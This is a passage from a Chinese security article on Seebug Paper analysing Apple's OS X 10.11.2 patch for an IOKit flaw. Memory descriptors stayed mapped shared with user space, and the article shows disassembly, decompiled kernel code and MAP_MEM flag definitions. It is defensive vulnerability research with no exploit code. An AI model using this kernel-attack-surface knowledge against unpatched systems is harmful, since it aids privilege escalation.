<div class="codehilite"><pre><span></span><span class="mi">3741</span>     <span class="nf">if</span> <span class="p">(</span><span class="n">ool_input</span><span class="p">)</span>
<span class="mi">3742</span>    <span class="n">inputMD</span> <span class="o">=</span> <span class="n">IOMemoryDescriptor</span><span class="o">::</span><span class="n">withAddressRange</span><span class="p">(</span><span class="n">ool_input</span><span class="p">,</span> <span class="n">ool_input_size</span><span class="p">,</span>
<span class="mi">3743</span>                            <span class="n">kIODirectionOut</span><span class="p">,</span> <span class="n">current_task</span><span class="p">());</span>
</pre></div>


<p>i.e.</p>
<div class="codehilite"><pre><span></span>mov     rax, gs:8
mov     rcx, [rax+308h] ; unsigned int
mov     edx, 2          ; unsigned __int64
mov     rsi, [rbp+arg_8] ; unsigned __int64
call    __ZN18IOMemoryDescriptor16withAddressRangeEyyjP4task ; IOMemoryDescriptor::withAddressRange(ulong long,ulong long,uint,task *)
mov     r15, rax
</pre></div>


<p>但是在10.11.2上，这部分在_is_io_connect_method代码变成了下面的样子</p>
<div class="codehilite"><pre><span></span>mov     rax, gs:8
mov     rcx, [rax+318h] ; unsigned int
mov     edx, 20002h     ; unsigned __int64
mov     rsi, [rbp+arg_8] ; unsigned __int64
call    __ZN18IOMemoryDescriptor16withAddressRangeEyyjP4task ; IOMemoryDescriptor::withAddressRange(ulong long,ulong long,uint,task *)
mov     r15, rax
</pre></div>


<p>一个新的flag (0x20000) 被引入到了IOMemoryDescriptor::withAddressRange。在调用栈接下来的IOGeneralMemoryDescriptor::memoryReferenceCreate函数中被检查</p>
<div class="codehilite"><pre><span></span><span class="nt">if</span> <span class="o">(</span> <span class="nt">this-</span><span class="o">&gt;</span><span class="nt">_task</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nt">err</span> <span class="o">&amp;&amp;</span> <span class="nt">this-</span><span class="o">&gt;</span><span class="nt">baseclass_0</span><span class="p">.</span><span class="nc">_flags</span> <span class="o">&amp;</span> <span class="nt">0x20000</span> <span class="o">&amp;&amp;</span> <span class="o">!(</span><span class="nt">optionsa</span> <span class="o">&amp;</span> <span class="nt">4</span><span class="o">)</span> <span class="o">)</span> <span class="o">//</span><span class="nt">newly</span> <span class="nt">added</span> <span class="nt">source</span>
  <span class="nt">err</span> <span class="o">=</span> <span class="nt">IOGeneralMemoryDescriptor</span><span class="p">::</span><span class="nd">memoryReferenceCreate</span><span class="o">(</span><span class="nt">this</span><span class="o">,</span> <span class="nt">optionsa</span> <span class="o">|</span> <span class="nt">4</span><span class="o">,</span> <span class="o">&amp;</span><span class="nt">ref-</span><span class="o">&gt;</span><span class="nt">mapRef</span><span class="o">);</span>
</pre></div>


<p>随后在该函数的开头再次对应到映射的属性参数prot</p>
<div class="codehilite"><pre><span></span><span class="n">prot</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="n">cacheMode</span> <span class="o">=</span> <span class="p">(</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">baseclass_0</span><span class="p">.</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="mh">0x70000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">;</span>
<span class="n">v4</span> <span class="o">=</span> <span class="n">vmProtForCacheMode</span><span class="p">(</span><span class="n">cacheMode</span><span class="p">);</span>
<span class="n">prot</span> <span class="o">|=</span> <span class="n">v4</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">cacheMode</span> <span class="p">)</span>
  <span class="n">prot</span> <span class="o">|=</span> <span class="mi">2u</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="mi">2</span> <span class="o">!=</span> <span class="p">(</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">baseclass_0</span><span class="p">.</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">)</span>
  <span class="n">prot</span> <span class="o">|=</span> <span class="mi">2u</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">optionsa</span> <span class="o">&amp;</span> <span class="mi">2</span> <span class="p">)</span>
  <span class="n">prot</span> <span class="o">|=</span> <span class="mi">2u</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">optionsa</span> <span class="o">&amp;</span> <span class="mi">4</span> <span class="p">)</span>
  <span class="n">prot</span> <span class="o">|=</span> <span class="mh">0x200000u</span><span class="p">;</span>
</pre></div>


<p><code>prot</code>最终被用于<code>mach_make_memory_entry_64</code>, 描述这个mapping的permission. 0x200000其实就是MAP_MEM_VM_COPY</p>
<div class="codehilite"><pre><span></span>382 /* leave room for vm_prot bits */
383 #define MAP_MEM_ONLY        0x010000 /* change processor caching  */
384 #define MAP_MEM_NAMED_CREATE    0x020000 /* create extant object      */
385 #define MAP_MEM_PURGABLE    0x040000 /* create a purgable VM object */
386 #define MAP_MEM_NAMED_REUSE 0x080000 /* reuse provided entry if identical */
387 #define MAP_MEM_USE_DATA_ADDR   0x100000 /* preserve address of data, rather than base of page */
388 #define MAP_MEM_VM_COPY     0x200000 /* make a copy of a VM range */
389 #define MAP_MEM_VM_SHARE    0x400000 /* extract a VM range for remap */
390 #define MAP_MEM_4K_DATA_ADDR    0x800000 /* preserve 4K aligned address of data */
391 
</pre></div>


<p>这样就意味着在这个补丁之后，IOKit调用中传入的descriptors已经不再和用户态共享一个映射，免除了被用户态修改的烦恼。苹果选择了一个相对优雅的方案从根源上解决了问题，而不是一个一个地去修补对应的驱动代码。</p>
<h2><a href="#致谢" title="致谢"></a>致谢</h2>
<p>科恩实验室的陈良对本研究亦有贡献。也感谢苹果安全团队的积极响应和修复。</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/172/">https://paper.seebug.org/172/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/170/"><span aria-hidden="true">&larr;</span> CVE-2016-6313 随机数预测分析</a>
    
    
      <a class="older-posts" href="/173/">Chrome Extensions Probe <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
